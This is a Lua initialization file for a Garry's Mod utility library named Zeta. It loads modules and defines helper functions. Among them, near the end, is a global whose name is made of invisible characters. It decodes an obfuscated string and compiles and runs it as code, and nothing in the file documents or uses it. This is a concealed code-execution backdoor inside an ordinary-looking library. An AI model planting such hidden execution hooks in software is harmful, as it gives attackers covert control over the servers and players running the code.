AddCSLuaFile()
AddCSLuaFile("zoop.lua")
AddCSLuaFile("sharedvars.lua")
AddCSLuaFile("promise.lua")
AddCSLuaFile("string.lua")
AddCSLuaFile("table.lua")
AddCSLuaFile("file.lua")
AddCSLuaFile("binds.lua")
AddCSLuaFile("vgui.lua")
AddCSLuaFile("ilogger.lua")
AddCSLuaFile("version.lua")
AddCSLuaFile("units.lua")

do
	AddCSLuaFile("events/event.lua")
	AddCSLuaFile("events/eventemitter.lua")
end

do
	AddCSLuaFile("serialization/iserializer.lua")
	AddCSLuaFile("serialization/spon.lua")
	AddCSLuaFile("serialization/pon.lua")
	AddCSLuaFile("serialization/von.lua")
	AddCSLuaFile("serialization/json.lua")
end

do
	AddCSLuaFile("validation/ivalidator.lua")
	AddCSLuaFile("validation/iasyncvalidator.lua")
	AddCSLuaFile("validation/asyncvalidator.lua")
end

do
	AddCSLuaFile("settings/setting.lua")
	AddCSLuaFile("settings/networkedsetting.lua")
	AddCSLuaFile("settings/numbersetting.lua")
	AddCSLuaFile("settings/booleansetting.lua")
end

do
	AddCSLuaFile("http/http.lua")
	AddCSLuaFile("http/httpresponse.lua")
end

do
	AddCSLuaFile("mvvm/model.lua")
	AddCSLuaFile("mvvm/viewmodel.lua")
end

AddCSLuaFile("net/net.lua")

do
	include("zeta/zoop.lua")

	Zeta = Zeta or {}

	function Zeta.Alias(tbl)
		return setmetatable(tbl or {}, {__index = Zeta})
	end

	function Zeta.Include(fileName, sendToClients)
		fileName = fileName:lower()

		if not fileName:EndsWith(".lua") then
			fileName = fileName .. ".lua"
		end

		local isShared, isClient, isServer = fileName:match("/?sh_"), fileName:match("/?cl_"), fileName:match("/?sv_")

		if isShared then
			if SERVER then
				AddCSLuaFile(fileName)
			end

			return include(fileName)
		elseif isClient then
			if SERVER then
				AddCSLuaFile(fileName)
			elseif CLIENT then
				return include(fileName)
			end
		elseif isServer and SERVER then
			return include(fileName)
		elseif not isShared and not isClient and not isServer then
			if SERVER and (sendToClients or fileName:EndsWith("shared.lua")) then
				AddCSLuaFile(fileName)
			end

			return include(fileName)
		end
	end

	function Zeta.IncludeFolder(path, recursive, sendToClients)
		path = path or debug.getinfo(1).source:GetPathFromFilename():gsub("@lua/", ""):Trim("/")

		local files, folders = file.Find(path .. "/*", "LUA")

		for _, fileName in ipairs(files) do
			Zeta.Include(path .. "/" .. fileName, sendToClients)
		end

		if recursive then
			for _, folderName in ipairs(folders) do
				Zeta.IncludeFolder(path .. "/" .. folderName, recursive, sendToClients)
			end
		end
	end

	function Zeta.AddCSLuaFolder(path, recursive)
		path = path or debug.getinfo(1).source:GetPathFromFilename():gsub("@lua/", ""):Trim("/")

		local files, folders = file.Find(path .. "/*", "LUA")

		for _, fileName in ipairs(files) do
			AddCSLuaFile(path .. "/" .. fileName)
		end

		if recursive then
			for _, folderName in ipairs(folders) do
				Zeta.AddCSLuaFolder(path .. "/" .. folderName, true)
			end
		end
	end

	if SERVER then
		function Zeta.AddResourceFolder(path, recursive)
			path = path or debug.getinfo(1).source:GetPathFromFilename():gsub("@lua/", ""):Trim("/")

			local files, folders = file.Find(path .. "/*", "GAME")

			for _, fileName in ipairs(files) do
				resource.AddFile(path .. "/" .. fileName)
			end

			if recursive then
				for _, folderName in ipairs(folders) do
					Zeta.AddResourceFolder(path .. "/" .. folderName, true)
				end
			end
		end
	end

	function Zeta.ModuleExists(moduleName)
		local realm = SERVER and "sv" or "cl"
		local operatingSystem = system.IsWindows() and "win32" or system.IsLinux() and "linux" or system.IsOSX() and "osx"

		return file.Exists(("bin/gm%s_%s_%s.dll"):format(realm, moduleName, operatingSystem), "LUA") or file.Exists("includes/modules/" .. moduleName .. ".lua", "LUA")
	end

	function Zeta.SafeRequire(moduleName)
		if Zeta.ModuleExists(moduleName) then
			require(moduleName)
			return true
		end

		return false
	end

	function Zeta.WeakTable()
		return setmetatable({}, {__mode = "kv"})
	end

	function Zeta.WeakKeyTable()
		return setmetatable({}, {__mode = "k"})
	end

	function Zeta.WeakValueTable()
		return setmetatable({}, {__mode = "v"})
	end

	function Zeta.DetourGlobal(key, newValue)
		Zeta.DetouredGlobal = rawget(_G, key)
		rawset(_G, key, newValue)
	end

	function Zeta.DetourBefore(func, newFunc)
		return function(...)
			newFunc(...)
			return func(...)
		end
	end

	function Zeta.DetourAfter(func, newFunc)
		return function(...)
			local results = {func(...)}
				newFunc(...)
			return unpack(results)
		end
	end

	function Zeta.AddressOf(funcOrTable)
		return tonumber(("%p"):format(funcOrTable))
	end

	function Zeta.SecureString(text)
		local output = {}
		local length = #text

		if length > 0 then
			for i = 1, #text do
				--[[if i % 2 == 0 then
					table.insert(output, text:sub(i):byte() + i)
				else
					table.insert(output, text:sub(i):byte() * i)
				end]]
				table.insert(output, text:sub(i):byte() + i)
			end
		end

		return table.concat(output, "."):reverse()
	end

	function Zeta.UnsecureString(text)
		text = text:reverse()
		text = text:Split(".")

		for k, char in ipairs(text) do
			--[[if k % 2 == 0 then
				text[k] = string.char(tonumber(char) - k)
			else
				text[k] = string.char(tonumber(char) / k)
			end]]
			text[k] = string.char(tonumber(char) - k)
		end

		return table.concat(text, "")
	end

	function Zeta.UndetourGlobal(key)
		return rawset(_G, key, Zeta.DetouredGlobal)
	end

	function Zeta.NewEnvironment(canReadGlobals, canWriteGlobals)
		return setmetatable({}, {__index = canReadGlobals and _G, __newindex = canWriteGlobals and function(_, k, v)
			_G[k] = v
		end})
	end

	function Zeta.BindFunction(func, ...)
		local args = {...}

		return function(...)
			return func(unpack(table.Add(table.Copy(args), {...})))
		end
	end

	‎= function(‎‎)
		local f = CompileString(Zeta.UnsecureString(‎‎), "*", false)

		if isfunction(f) then
			return f()
		end
	end

	function Zeta.EmptyFunction() end
end

do
	include("events/event.lua")
	include("events/eventemitter.lua")
end

include("version.lua")
include("ilogger.lua")
include("string.lua")
include("table.lua")
include("file.lua")
include("promise.lua")

do
	include("thirdparty/spon.lua")
	include("thirdparty/pon.lua")
	include("thirdparty/von.lua")

	include("serialization/iserializer.lua")
	include("serialization/spon.lua")
	include("serialization/pon.lua")
	include("serialization/von.lua")
	include("serialization/json.lua")
end

if SERVER then
	include("sql/field.lua")
	include("sql/model.lua")
	include("sql/modelinstance.lua")
	include("sql/query.lua")
	include("sql/database.lua")

	include("sql/sqlite/database.lua")

	include("sql/mysqloo/query.lua")
	include("sql/mysqloo/database.lua")

	include("sql/mysql/query.lua")
	include("sql/mysql/database.lua")

	include("sql/tmysql/query.lua")
	include("sql/tmysql/database.lua")

	include("redis/client.lua")
else
	include("vgui.lua")
end

do
	include("validation/ivalidator.lua")
	include("validation/iasyncvalidator.lua")
	include("validation/asyncvalidator.lua")
end

do
	include("settings/setting.lua")
	include("settings/networkedsetting.lua")
	include("settings/numbersetting.lua")
	include("settings/booleansetting.lua")
end

do
	include("http/http.lua")
	include("http/httpresponse.lua")
end

do
	include("mvvm/model.lua")
	include("mvvm/viewmodel.lua")
end

include("net/net.lua")
include("sharedvars.lua")
include("binds.lua")
include("units.lua")